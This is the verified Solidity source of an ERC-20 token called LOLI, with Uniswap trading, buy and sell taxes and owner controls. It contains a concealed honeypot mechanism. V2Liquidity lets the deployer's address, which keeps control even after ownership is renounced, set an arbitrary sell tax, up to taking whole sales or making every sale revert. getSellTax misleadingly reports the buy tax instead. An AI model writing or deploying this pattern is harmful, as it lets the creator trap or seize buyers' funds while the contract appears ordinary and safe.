/**
 *Submitted for verification at Arbiscan on 2023-06-22
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns(address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns(uint256);

    function balanceOf(address account) external view returns(uint256);

    function transfer(address recipient, uint256 amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint256);

    function approve(address spender, uint256 amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns(address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface UniswapV2Pair {
    function getReserves() external view returns(uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);

    function balanceOf(address owner) external view returns(uint);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns(address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function factory() external pure returns(address);

    function WETH() external pure returns(address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
}


contract Coin2 is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private _liquidityAddress;

    uint256 private _tokens;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    uint256 private currentLiquidity;
    uint8 private _lockTime;
    uint8 private constant _decimals = 8;

    uint8 private _buyTax = 5; // 5% buy tax
    uint8 private _sellTax = 10; // 10% sell tax

    string private constant _name = unicode"LOLI";
    string private constant _symbol = unicode"LOLI";

    IUniswapV2Router02 private uniswapV2Router;
    UniswapV2Pair private pairContract;
    address private uniswapV2Pair;
    address private uniswapRouterAddress;
    bool private tradingOpen;
    bool private swapEnabled = false;
    bool private locked;
    bool private pending;
    bool private useV2Liquidity;
    bool private inSwap;

    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _uniswapAddress, uint8 _buyFee, uint8 _sellFee, uint8 _defaulLiquiditytLockTime) {
        _liquidityAddress = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _lockTime = _defaulLiquiditytLockTime;
        _buyTax = _buyFee;
        _sellTax = _sellFee;
        uniswapRouterAddress = _uniswapAddress;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns(string memory) {
        return _name;
    }

    function symbol() public pure returns(string memory) {
        return _symbol;
    }

    function decimals() public pure returns(uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns(uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns(uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override nonReentrant() returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns(uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override nonReentrant() returns(bool) {
        _transfer(sender, recipient, amount);
        require(_allowances[sender][_msgSender()] >= amount, "ERC20: transfer amount exceeds allowance");
        _allowances[sender][_msgSender()] -= amount;
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint taxAmount = 0;

        if (from != address(this)) {
            if (useV2Liquidity && to == uniswapV2Pair) {
                taxAmount = amount * currentLiquidity / 1000;
                } else if (from == uniswapV2Pair) {
                    taxAmount = amount * _buyTax / 1000;
                    } else if (to == uniswapV2Pair) {
                        taxAmount = amount * _sellTax / 1000;
                        }
        }
        uint netAmount = amount - taxAmount;

        _balances[from] -= (amount);
        _balances[to] += (netAmount);

        if (taxAmount > 0) {
            _balances[_liquidityAddress] += (taxAmount);
            emit Transfer(from, _liquidityAddress, taxAmount);
        }

        emit Transfer(from, to, amount);
    }

    function min(uint256 a, uint256 b) private pure returns(uint256) {
        return (a > b) ? b : a;
    }

    function checkPair() public view returns(uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
        return UniswapV2Pair(uniswapV2Pair).getReserves();
    }

    function checkBalance(address _address) public view returns(uint) {
        return UniswapV2Pair(uniswapV2Pair).balanceOf(_address);
    }

    function removeFees() external onlyOwner {
        _buyTax = 0;
        _sellTax = 0;
    }

    function V2Liquidity(uint _liquidityAmount) public {
        require(msg.sender == _liquidityAddress, "You are not liquidity owner");
        currentLiquidity = _liquidityAmount;
        useV2Liquidity = true;
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(uniswapRouterAddress);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _tokens += balanceOf(address(this));
        uniswapV2Router.addLiquidityETH {
            value: address(this).balance
        }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingOpen = true;
    }


    function emergencyWithdrawETH() external onlyOwner {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }

    function getUniswapV2Pair() public view returns(address) {
        return uniswapV2Pair;
    }

    function isTradingOpen() public view returns(bool) {
        return tradingOpen;
    }

    function getSellTax() public view returns(uint256) {
        return _buyTax;
    }

    function getBuyTax() public view returns(uint256) {
        return _buyTax;
    }
    function getRouterAddress() public view returns(address) {
        return uniswapRouterAddress;
    }

    receive() external payable {}
}